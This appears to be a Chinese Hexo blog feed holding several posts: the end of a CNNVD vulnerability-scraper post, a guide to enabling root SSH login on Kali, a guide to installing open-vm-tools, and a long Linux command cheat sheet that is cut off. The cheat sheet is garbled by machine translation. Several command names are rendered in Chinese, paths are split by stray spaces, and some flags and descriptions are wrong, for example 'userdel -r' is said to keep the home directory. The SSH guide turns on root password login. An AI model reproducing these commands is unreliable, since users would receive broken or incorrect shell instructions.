2019-08-28</code>：需要爬取的时间范围（需要自行在CNNVD上查看对应日期范围的总页数），中间有空格</p><p><code>26</code> : 需要爬行的页数（需要自行在CNNVD上查看对应日期范围的总页数）</p><p>示例截图：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190830170647.png" class="lozad"></p><p>自动生成生成的Excel表格</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190830170738.png" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>在这里谈一下脚本的优势和劣势吧</p><p>脚本优势：可以指定日期范围漏洞的爬行，真心强大</p><p>脚本劣势：爬虫爬行时，会有部分遗漏信息，所以需要在爬行完成后再手动的添加；爬虫爬行的速度不是很快，不是多线程的.</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.cnblogs.com/kaiho/p/7804542.html" target="_blank" rel="noopener">https://www.cnblogs.com/kaiho/p/7804542.html</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh连接不上kali问题</title>
      <link href="/2019/08/27/ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Akali%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/27/ssh%E8%BF%9E%E6%8E%A5%E4%B8%8D%E4%B8%8Akali%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>很多人在虚拟机中安装kali Linux，但是可能由于自己电脑配置的问题，导致使用起来非常的卡顿，所以想用xshell这样的远程终端工具来连接kali Linux。但是问题来了，怎么连接都连接不上，ip地址，用户名和密码什么的都配置正确，so，那可能就是配置的问题了。具体方法，请看下文。</p><a id="more"></a><h1 id="0x01-修改跟新源"><a href="#0x01-修改跟新源" class="headerlink" title="0x01 修改跟新源"></a>0x01 修改跟新源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list <span class="comment">#使用vim编辑器修改</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list <span class="comment">#使用可视化编辑器修改（好用）</span></span><br></pre></td></tr></table></figure><p>跟新源</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#阿里云</span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#清华大学</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line"><span class="comment">#浙大</span></span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line"><span class="comment">#东软大学</span></span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#官方源</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重庆大学</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>保存关闭，<code>vim</code>需要按<code>ESC</code>键，然后按<code>hift+ :</code>，输入<code>wq</code>，保存并退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h1 id="0x02-开启-ssh"><a href="#0x02-开启-ssh" class="headerlink" title="0x02 开启**ssh**"></a>0x02 <strong>开启**</strong>ssh**</h1><ol><li><p>修改sshd_config文件，命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">leafpad /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></li><li><p>将<code>#PasswordAuthentication no</code>的注释去掉，并且将<code>NO</code>修改为<code>YES</code> (kali中默认是yes)</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190827233510.png" class="lozad"></p></li><li><p>将<code>PermitRootLogin without-password</code>修改为<code>PermitRootLogin yes</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190827233532.png" class="lozad"></p></li><li><p>启动ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure></li><li><p>如果还是不能链接，重启就可以了</p></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali Linux在安装vmtool时碰到的问题</title>
      <link href="/2019/08/27/%E5%9C%A8%E5%AE%89%E8%A3%85vmtool%E6%97%B6%E7%A2%B0%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/27/%E5%9C%A8%E5%AE%89%E8%A3%85vmtool%E6%97%B6%E7%A2%B0%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在kali Linux跟新到2018.2版本以后，使用虚拟机自带的vmtool进行安装</p><p>已经没有效果了，不能是屏幕适应客户端和拖拽操作，为此在网上搜了很多相关</p><p>的文档，最终找到了open-vm-tools-desktop 这个软件，下面来详细的介绍该</p><p>软件的安装</p><a id="more"></a><h1 id="0x01-配置跟新源"><a href="#0x01-配置跟新源" class="headerlink" title="0x01 配置跟新源"></a>0x01 配置跟新源</h1><p>在终端中输入：leafpad<br>/etc/apt/sources.list,然后添加以下跟新源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#中科大跟新源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><br><span class="line"> </span><br><span class="line">#阿里云跟新源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/kali-security kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><h1 id="0x02-跟新系统"><a href="#0x02-跟新系统" class="headerlink" title="0x02 跟新系统"></a>0x02 跟新系统</h1><p>终端输入 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update <span class="comment">#跟新系统</span></span><br><span class="line">apt-get dist-upgrade <span class="comment">#跟新软件 （可自己选择操作）</span></span><br></pre></td></tr></table></figure><h1 id="0x03-安装vmtool"><a href="#0x03-安装vmtool" class="headerlink" title="0x03 安装vmtool"></a>0x03 安装vmtool</h1><p>终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>在安装vmtools这个问题上，上网百度了好久，但是没有相关的信息，最后在一个论坛中看到了，没想到还真解决了，一条命令解决问题，真是太爽了，比传统的安装方式还要方便。总之，碰到问题以后多从百度，Google中搜集相关的信息，一般情况下，你碰到的问题都会有人碰到过，这样你就可以直接使用别人的间接经验了，不过也要有选择性的，现在的互联网时代，数据大爆炸，很多时候因为一个复制粘贴别人文章的文章而踩大坑，本人也最讨厌这种直接复制别人的文章还不注明出处的人，导致看文章的人走弯路。emmm，ok，就这样结束~</p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>史上最全的Linux的常用命令</title>
      <link href="/2019/08/27/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84Linux%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/08/27/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8%E7%9A%84Linux%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文涵盖了Linux系统的很多命令，为了方便以后查找使用，在这里记录一下。</p><p>内容均从网上摘抄。</p><a id="more"></a><h1 id="0x01-系统信息"><a href="#0x01-系统信息" class="headerlink" title="0x01 系统信息"></a>0x01 系统信息</h1><p>arch显示机器的处理器架构（1）</p><p>uname -m显示机器的处理器架构（2）</p><p>uname -r显示正在使用的内核版本</p><p>dmidecode -q显示硬件系统部件 - （SMBIOS / DMI）</p><p>hdparm -i / dev / hda罗列一个磁盘的架构特性</p><p>hdparm -tT / dev / sda在磁盘上执行测试性读取操作</p><p>cat / proc / cpuinfo显示CPU信息的信息</p><p>cat / proc / interrupts显示中断</p><p>cat / proc / meminfo校验内存使用</p><p>cat / proc / swaps显示哪些swap被使用</p><p>cat / proc / version显示内核的版本</p><p>cat / proc / net / dev显示网络适配器及统计</p><p>cat / proc / mounts显示已加载的文件系统</p><p>lspci -tv罗列PCI设备</p><p>lsusb -tv显示USB设备</p><p>日期显示系统日期</p><p>cal 2007显示2007年的日历表</p><p>date 041217002007.00设置日期和时间 - 月日时分年。秒</p><p>clock -w将时间修改保存到BIOS</p><p>关系（系统的关机，重启以及登出）</p><p>shutdown -h now关闭系统（1）</p><p>init 0关闭系统（2）</p><p>telinit 0关闭系统（3）</p><p>shutdown -h hours：minutes＆按预定时间关闭系统</p><p>shutdown -c取消按预定时间关闭系统</p><p>shutdown -r now重启（1）</p><p>reboot重启（2）</p><p>注销注销</p><h1 id="0x02-文件和目录"><a href="#0x02-文件和目录" class="headerlink" title="0x02 文件和目录"></a>0x02 <strong>文件和目录</strong></h1><p>cd / home进入’/ home’目录’</p><p>cd ..返回上一级目录</p><p>cd ../ ..返回上两级目录</p><p>cd进入个人的主目录</p><p>cd~user1进入个人的主目录</p><p>cd - 返回上次所在的目录</p><p>pwd显示工作路径</p><p>ls查看目录中的文件</p><p>ls -F查看目录中的文件</p><p>ls -l显示文件和目录的详细资料</p><p>ls -a显示隐藏文件</p><p>ls * [0-9] *显示包含数字的文件名和目录名</p><p>tree显示文件和目录由根目录开始的树形结构（1）</p><p>lstree显示文件和目录由根目录开始的树形结构（2）</p><p>mkdir dir1创建一个叫做’dir1’的目录’</p><p>mkdir dir1 dir2同时创建两个目录</p><p>mkdir -p / tmp / dir1 / dir2创建一个目录树</p><p>rm -f file1删除一个叫做’file1’的文件’</p><p>rmdir dir1删除一个叫做’dir1’的目录’</p><p>rm -rf dir1删除一个叫做’dir1’的目录并同时删除其内容</p><p>rm -rf dir1 dir2同时删除两个目录及它们的内容</p><p>mv dir1 new_dir重命名/移动一个目录</p><p>cp file1 file2复制一个文件</p><p>cp目录/ *。复制一个目录下的所有文件到当前工作目录</p><p>cp -a / tmp / dir1。复制一个目录到当前工作目录</p><p>cp -a dir1 dir2复制一个目录</p><p>ln -s file1 lnk1创建一个指向文件或目录的软链接</p><p>ln file1 lnk1创建一个指向文件或目录的物理链接</p><p>touch -t 0712250000 file1修改一个文件或目录的时间戳 - （YYMMDDhhmm）</p><p>file file1将文件的mime类型输出为文本</p><p>iconv -l列出已知的编码</p><p>iconv -f fromEncoding -t toEncoding inputFile&gt; outputFile通过假设它在fromEncoding中编码并将其转换为toEncoding，从给定的输入文件创建一个新的。</p><p>找 。-maxdepth 1 -name * .jpg -print -exec convert“{}”-resize 80x60“thumbs / {}”; 批量调整当前目录中的文件大小并将它们发送到缩略图目录（需要从Imagemagick转换）</p><h1 id="0x03-文件搜索"><a href="#0x03-文件搜索" class="headerlink" title="0x03 文件搜索"></a>0x03 <strong>文件搜索</strong></h1><p>find / -name file1从’/‘开始进入根文件系统搜索文件和目录</p><p>find / -user user1搜索属于用户’user1’的文件和目录</p><p>find / home / user1 -name \ * .bin在目录’/ home / user1’中搜索带有’.bin’结尾的文件</p><p>find / usr / bin -type f -atime +100搜索在过去100天内未被使用过的的执行文件</p><p>find / usr / bin -type f -mtime -10搜索在10天内被创建或者修改过的文件</p><p>find / -name \ * .rpm -exec chmod 755’{}’; 搜索以’.rpm’结尾的文件并定义其权限</p><p>find / -xdev -name \ * .rpm搜索以’.rpm’结尾的文件，忽略光驱，捷盘等可移动设备</p><p>找到\ * .ps寻找以’.ps’结尾的文件 - 先运行’updatedb’命令</p><p>whereis halt显示一个二进制文件，源码或man的位置</p><p>停止显示一个二进制文件或可执行文件的完整路径</p><h1 id="0x04-挂载一个文件系统"><a href="#0x04-挂载一个文件系统" class="headerlink" title="0x04 挂载一个文件系统"></a>0x04 <strong>挂载一个文件系统</strong></h1><p>mount / dev / hda2 / mnt / hda2挂载一个叫做hda2的盘 - 确定目录’/ mnt / hda2’已经存在</p><p>umount / dev / hda2卸载一个叫做hda2的盘 - 先从挂载点’/ mnt / hda2’退出</p><p>fuser -km / mnt / hda2当设备繁忙时强制卸载</p><p>umount -n / mnt / hda2运行卸载操作而不写入/ etc / mtab文件 - 当文件为只读或当磁盘写满时非常有用</p><p>mount / dev / fd0 / mnt / floppy挂载一个软盘</p><p>mount / dev / cdrom / mnt / cdrom挂载一个cdrom或dvdrom</p><p>mount / dev / hdc / mnt / cdrecorder挂载一个cdrw或dvdrom</p><p>mount / dev / hdb / mnt / cdrecorder挂载一个cdrw或dvdrom</p><p>mount -o loop file.iso / mnt / cdrom挂载一个文件或ISO镜像文件</p><p>mount -t vfat / dev / hda5 / mnt / hda5挂载一个Windows FAT32文件系统</p><p>mount / dev / sda1 / mnt / usbdisk挂载一个usb捷盘或闪存设备</p><p>mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享</p><h1 id="0x05-磁盘空间"><a href="#0x05-磁盘空间" class="headerlink" title="0x05 磁盘空间"></a>0x05 <strong>磁盘空间</strong></h1><p>df -h显示已经挂载的分区列表</p><p>ls -lSr | more以尺寸大小排列文件和目录</p><p>du -sh dir1估算目录’dir1’已经使用的磁盘空间’</p><p>du -sk * | sort -rn以容量大小为依据依次显示文件和目录的大小</p><p>rpm -q -a –qf’％10 {SIZE} t％{NAME} n’| sort -k1,1n以大小为依据依次显示已安装的rpm包所使用的空间（fedora，redhat类系统）</p><p>dpkg-query -W -f =’$ {Installed-Size; 10} t $ {Package} n’| sort -k1,1n以大小为依据显示已安装的deb包所使用的空间（ubuntu，debian类系统）</p><h1 id="0x06-用户和群组"><a href="#0x06-用户和群组" class="headerlink" title="0x06 用户和群组"></a>0x06 用户和群组</h1><p>groupadd group_name创建一个新用户组</p><p>groupdel group_name删除一个用户组</p><p>groupmod -n new_group_name old_group_name重命名一个用户组</p><p>useradd -c“名字姓氏”-g admin -d / home / user1 -s / bin / bash user1创建一个属于“admin”用户组的用户</p><p>useradd user1创建一个新用户</p><p>userdel -r user1删除一个用户（’-r’排除主目录）</p><p>usermod -c“用户FTP”-g system -d / ftp / user1 -s / bin / nologin user1修改用户属性</p><p>passwd修改口令</p><p>passwd user1修改一个用户的口令（只允许root执行）</p><p>chage -E 2005-12-31 user1设置用户口令的失效期限</p><p>pwck检查’/ etc / passwd’的文件格式和语法修正以及存在的用户</p><p>grpck检查’/ etc / passwd’的文件格式和语法修正以及存在的群组</p><p>newgrp group_name登陆进一个新的群组以改变新创建文件的预设群组</p><h1 id="0x07-文件的权限"><a href="#0x07-文件的权限" class="headerlink" title="0x07 文件的权限"></a>0x07 文件的权限</h1><blockquote><p>使用“+”设置权限，使用“ - ”用于取消</p></blockquote><p>ls -lh显示权限</p><p>ls / tmp | pr -T5 -W $ COLUMNS将终端划分成5栏显示</p><p>chmod ugo + rwx directory1设置目录的所有人（u），群组（g）以及其他人（o）以读（r），写（w）和执行（x）的权限</p><p>chmod go-rwx directory1删除群组（g）与其他人（o）对目录的读写执行权限</p><p>chown user1 file1改变一个文件的所有人属性</p><p>chown -R user1 directory1改变一个目录的所有人属性并同时改变改目录下所述文件的属性</p><p>chgrp group1 file1改变文件的群组</p><p>chown user1：group1 file1改变一个文件的所有人和群组属性</p><p>find / -perm -u + s罗列一个系统中所有使用了SUID控制的文件</p><p>chmod u + s / bin / file1设置一个二进制文件的SUID位 - 运行该文件的用户也被赋予和所有者同样的权限</p><p>chmod us / bin / file1禁用一个二进制文件的SUID位</p><p>chmod g + s / home / public设置一个目录的SGID位 - 类似SUID，不过这是针对目录的</p><p>chmod gs / home / public禁用一个目录的SGID位</p><p>chmod o + t / home / public设置一个文件的STIKY位 - 只允许合法所有人删除文件</p><p>chmod ot / home / public禁用一个目录的STIKY位</p><h1 id="0x08-文件的特殊属性"><a href="#0x08-文件的特殊属性" class="headerlink" title="0x08 文件的特殊属性"></a>0x08 文件的特殊属性</h1><blockquote><p>使用“+”设置权限，使用“ - ”用于取消</p></blockquote><p>chattr + a file1只允许以追加方式读写文件</p><p>chattr + c file1允许这个文件能被内核自动压缩/解压</p><p>chattr + d file1在进行文件系统备份时，dump程序将忽略这个文件</p><p>chattr + i file1设置成不可变的文件，不能被删除，修改，重命名或者链接</p><p>chattr + s file1允许一个文件被安全地删除</p><p>chattr + S file1一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</p><p>chattr + u file1若文件被删除，系统会允许你在以后恢复这个被删除的文件</p><p>lsattr显示特殊的属性</p><h1 id="0x07-打包和压缩文件"><a href="#0x07-打包和压缩文件" class="headerlink" title="0x07 打包和压缩文件"></a>0x07 打包和压缩文件</h1><p>bunzip2 file1.bz2解压一个叫做’file1.bz2’的文件</p><p>bzip2 file1压缩一个叫做’file1’的文件</p><p>gunzip file1.gz解压一个叫做’file1.gz’的文件</p><p>gzip file1压缩一个叫做’file1’的文件</p><p>gzip -9 file1最大程度压缩</p><p>rar a file1.rar test_file创建一个叫做’file1.rar’的包</p><p>rar a file1.rar file1 file2 dir1同时压缩’file1’，’file2’以及目录’dir1’</p><p>rar x file1.rar解压rar包</p><p>unrar x file1.rar解压rar包</p><p>tar -cvf archive.tar file1创建一个非压缩的tarball</p><p>tar -cvf archive.tar file1 file2 dir1创建一个包含了’file1’，’file2’以及’dir1’的档案文件</p><p>tar -tf archive.tar显示一个包中的内容</p><p>tar -xvf archive.tar释放一个包</p><p>tar -xvf archive.tar -C / tmp将压缩包释放到/ tmp目录下</p><p>tar -cvfj archive.tar.bz2 dir1创建一个bzip2格式的压缩包</p><p>tar -xvfj archive.tar.bz2解压一个bzip2格式的压缩包</p><p>tar -cvfz archive.tar.gz dir1创建一个gzip格式的压缩包</p><p>tar -xvfz archive.tar.gz解压一个gzip格式的压缩包</p><p>zip file1.zip file1创建一个zip格式的压缩包</p><p>zip -r file1.zip file1 file2 dir1将几个文件和目录同时压缩成一个zip格式的压缩包</p><p>unzip<br>file1.zip解压一个zip格式压缩包</p><h1 id="0x08-RPM包-（Fedora，Redhat及类似系统）"><a href="#0x08-RPM包-（Fedora，Redhat及类似系统）" class="headerlink" title="0x08 RPM包 - （Fedora，Redhat及类似系统）"></a>0x08 RPM包 - （Fedora，Redhat及类似系统）</h1><p>rpm -ivh package.rpm安装一个rpm包</p><p>rpm -ivh –nodeeps package.rpm安装一个rpm包而忽略依赖关系警告</p><p>rpm -U package.rpm更新一个rpm包但不改变其配置文件</p><p>rpm -F package.rpm更新一个确定已经安装的rpm包</p><p>rpm -e package_name.rpm删除一个rpm包</p><p>rpm -qa显示系统中所有已经安装的rpm包</p><p>rpm -qa | grep httpd显示所有名称中包含“httpd”字样的rpm包</p><p>rpm -qi package_name获取一个已安装包的特殊信息</p><p>rpm -qg“System Environment / Daemons”显示一个组件的rpm包</p><p>rpm -ql package_name显示一个已经安装的rpm包提供的文件列表</p><p>rpm -qc package_name显示一个已经安装的rpm包提供的配置文件列表</p><p>rpm -q package_name –whatrequires显示与一个rpm包存在依赖关系的列表</p><p>rpm -q package_name –whatprovides显示一个rpm包所占的体积</p><p>rpm -q package_name –scripts显示在安装/删除期间所执行的脚本l</p><p>rpm -q package_name –changelog显示一个rpm包的修改历史</p><p>rpm -qf /etc/httpd/conf/httpd.conf确认所给的文件由哪个rpm包所提供</p><p>rpm -qp package.rpm -l显示由一个尚未安装的rpm包提供的文件列表</p><p>rpm –import / media / cdrom / RPM-GPG-KEY导入公司数字证书</p><p>rpm –checksig package.rpm确认一个rpm包的完整性</p><p>rpm -qa gpg-pubkey确认已安装的所有rpm包的完整性</p><p>rpm -V package_name检查文件尺寸，许可，类型，所有者，群组，MD5检查以及最后修改时间</p><p>rpm -Va检查系统中所有已安装的rpm包 - 小心使用</p><p>rpm -Vp package.rpm确认一个rpm包还未安装</p><p>rpm2cpio package.rpm | cpio –extract –make-directories * bin *从一个rpm包运行可执行文件</p><p>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm从一个rpm源码安装一个构建好的包</p><p>rpmbuild –rebuild package_name.src.rpm从一个rpm源码构建一个rpm包</p><h1 id="0x09-YUM软件包升级器-（Fedora，RedHat及类似系统）"><a href="#0x09-YUM软件包升级器-（Fedora，RedHat及类似系统）" class="headerlink" title="0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）"></a>0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）</h1><p>yum install package_name下载并安装一个rpm包</p><p>yum localinstall package_name.rpm将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</p><p>yum update package_name.rpm更新当前系统中所有安装的rpm包</p><p>yum update package_name更新一个rpm包</p><p>yum remove package_name删除一个rpm包</p><p>yum list列出当前系统中安装的所有包</p><p>yum search package_name在rpm仓库中搜寻软件包</p><p>yum clean packages清理rpm缓存删除下载的包</p><p>yum clean headers删除所有头文件</p><p>yum clean all删除所有缓存的包和头文件</p><h1 id="0x10-DEB包（Debian，Ubuntu以及类似系统）"><a href="#0x10-DEB包（Debian，Ubuntu以及类似系统）" class="headerlink" title="0x10 DEB包（Debian，Ubuntu以及类似系统）"></a>0x10 DEB包（Debian，Ubuntu以及类似系统）</h1><p>dpkg -i package.deb安装/更新一个deb包</p><p>dpkg -r package_name从系统删除一个deb包</p><p>dpkg -l显示系统中所有已经安装的deb包</p><p>dpkg -l | grep httpd显示所有名称中包含“httpd”字样的deb包</p><p>dpkg -s package_name获得已经安装在系统中一个特殊包的信息</p><p>dpkg -L package_name显示系统中已经安装的一个deb包所提供的文件列表</p><p>dpkg –contents package.deb显示尚未安装的一个包所提供的文件列表</p><p>dpkg -S / bin / ping确认所给的文件由哪个deb包提供</p><h1 id="0x11-APT软件工具（Debian，Ubuntu以及类似系统）"><a href="#0x11-APT软件工具（Debian，Ubuntu以及类似系统）" class="headerlink" title="0x11 APT软件工具（Debian，Ubuntu以及类似系统）"></a>0x11 APT软件工具（Debian，Ubuntu以及类似系统）</h1><p>apt-get install package_name安装/更新一个deb包</p><p>apt-cdrom install package_name从光盘安装/更新一个deb包</p><p>apt-get update升级列表中的软件包</p><p>apt-get upgrade升级所有已安装的软件</p><p>apt-get remove package_name从系统删除一个deb包</p><p>apt-get check确认依赖的软件仓库正确</p><p>apt-get clean从下载的软件包中清理缓存</p><p>apt-cache search search-package返回包含所要搜索字符串的软件包名称</p><h1 id="0x12-查看文件内容"><a href="#0x12-查看文件内容" class="headerlink" title="0x12 查看文件内容"></a>0x12 查看文件内容</h1><p>cat file1从第一个字节开始正向查看文件的内容</p><p>tac file1从最后一行开始反向查看一个文件的内容</p><p>更多file1查看一个长文件的内容</p><p>less file1类似于’more’命令，但是它允许在文件中和正向操作一样的反向操作</p><p>head -2 file1查看一个文件的前两行</p><p>tail -2 file1查看一个文件的最后两行</p><p>tail -f / var / log / messages实时查看被添加到一个文件中的内容</p><h1 id="0x13-文本处理"><a href="#0x13-文本处理" class="headerlink" title="0x13 文本处理"></a>0x13 文本处理</h1><p>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt使用PIPE，STDIN和STDOUT进行文本操作的一般语法</p><p>cat file1 | 命令（sed，grep，awk，grep等等）&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个新文件中</p><p>cat file1 | 命令（sed，grep，awk，grep等等）&gt;&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个已有的文件中</p><p>grep Aug / var / log / messages在文件’/ var / log / messages’中查找关键词“Aug”</p><p>grep ^ Aug / var / log / messages在文件’/ var / log / messages’中查找以“Aug”开始的词汇</p><p>grep [0-9] / var / log / messages选择’/ var / log / messages’文件中所有包含数字的行</p><p>grep Aug -R / var / log / *在目录’/ var / log’及随后的目录中搜索字符串“Aug”</p><p>sed’s / stringa1 / stringa2 / g’example.txt将example.txt文件中的“string1”替换成“string2”</p><p>sed’/ ^ $ / d’example.txt从example.txt文件中删除所有空白行</p><p>sed’/ *＃/ d; / ^ $ / d’example.txt从example.txt文件中删除所有注释和空白行</p><p>echo’esempio’| tr’[：lower：]’’[：upper：]’合并上下单元格内容</p><p>sed -e’1d’rend.txt从文件example.txt中排除第一行</p><p>sed -n’/ stringa1 / p’查看只包含词汇“string1”的行</p><p>sed -e’s / * $ //‘example.txt删除每一行最后的空白字符</p><p>sed -e’s / stringa1 // g’example.txt从文档中只删除词汇“string1”并保留剩余全部</p><p>sed -n’1,5p; 5q’example.txt查看从第一行到第5行内容</p><p>sed -n’5p; 5q’example.txt查看第5行</p><p>sed -e’s / 00 * / 0 / g’example.txt用单个零替换多个零</p><p>cat -n file1标示文件的行数</p><p>cat example.txt | awk’NR％2 == 1’删除example.txt文件中的所有偶数行</p><p>echo abc | awk’{print $ 1}’查看一行第一栏</p><p>echo abc | awk’{print $ 1，$ 3}’查看一行的第一和第三栏</p><p>paste file1 file2合并两个文件或两栏的内容</p><p>paste -d’+’file1 file2合并两个文件或两栏的内容，中间用“+”区分</p><p>sort file1 file2排序两个文件的内容</p><p>sort file1 file2 | uniq取出两个文件的并集（重复的行只保留一份）</p><p>sort file1 file2 | uniq -u删除交集，留下其他的行</p><p>sort file1 file2 | uniq -d取出两个文件的交集（只留下同时存在于两个文件中的文件）</p><p>comm -1 file1 file2比较两个文件的内容只删除’file1’所包含的内容</p><p>comm -2 file1 file2比较两个文件的内容只删除’file2’所包含的内容</p><p>comm -3 file1 file2比较两个文件的内容只删除两个文件共有的部分</p><h1 id="0x14-字符设置和文件格式转换"><a href="#0x14-字符设置和文件格式转换" class="headerlink" title="0x14 字符设置和文件格式转换"></a>0x14 字符设置和文件格式转换</h1><p>dos2unix filedos.txt fileunix.txt将一个文本文件的格式从MSDOS转换成UNIX</p><p>unix2dos fileunix.txt filedos.txt将一个文本文件的格式从UNIX转换成MSDOS</p><p>recode ..HTML &lt;page.txt&gt; page.html将一个文本文件转换成html</p><p>recode -l | 更多显示所有允许的转换格式</p><h1 id="0x15-文件系统分析"><a href="#0x15-文件系统分析" class="headerlink" title="0x15 文件系统分析"></a>0x15 <strong>文件系统分析</strong></h1><p>badblocks -v / dev / hda1检查磁盘hda1上的坏磁块</p><p>fsck / dev / 